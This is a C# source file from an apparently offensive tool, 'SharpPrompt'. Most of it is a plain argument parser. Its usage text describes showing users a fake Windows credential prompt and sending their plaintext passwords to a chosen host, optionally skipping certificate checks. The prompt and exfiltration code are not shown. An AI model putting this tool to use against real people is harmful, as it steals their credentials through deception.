using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SharpPrompt
{
    public static class ArgumentParser
    {
        public static ArgumentParserResult Parse(IEnumerable<string> args)
        {
            var arguments = new Dictionary<string, string>();
            try
            {
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                    {
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    }
                    else
                    {
                        idx = argument.IndexOf('=');
                        if (idx > 0)
                        {
                            arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                        }
                        else
                        {
                            arguments[argument] = string.Empty;
                        }
                    }
                }

                return ArgumentParserResult.Success(arguments);
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message);
                return ArgumentParserResult.Failure();
            }
        }
    }

    public static class Info
    {
        public static void ShowUsage()
        {
            string usage = @"
    Display a Windows credential prompt to the user which sends the plaintext password back over HTTP/HTTPS

    Specify the host using '/host:' flag. It will use http by default so no need specify the connection in the argument.
        Example: /host:192.168.0.1 | /host:example.com

    You can use the '/https' flag for specifying to use an https connection. [!] This method uses certificate validation.

    If you have a self-signed certifcate, just specify 'https://' in the host argument without using the /https flag
        The creds will be sent over https while skipping certificate validation.

    /host: | Host to send results to | [Required] 
    /text: | Text to display on prompt | [Optional] (Default: 'Making sure it's you')
    /https | Specify HTTPS exfiltration | [Optional] (Uses certificate validation)
            ";
            Console.WriteLine(usage);
        }
    }

    public class ArgumentParserResult
    {
        public bool ParsedOk { get; }
        public Dictionary<string, string> Arguments { get; }

        private ArgumentParserResult(bool parsedOk, Dictionary<string, string> arguments)
        {
            ParsedOk = parsedOk;
            Arguments = arguments;
        }

        public static ArgumentParserResult Success(Dictionary<string, string> arguments)
            => new ArgumentParserResult(true, arguments);

        public static ArgumentParserResult Failure()
            => new ArgumentParserResult(false, null);

    }
}
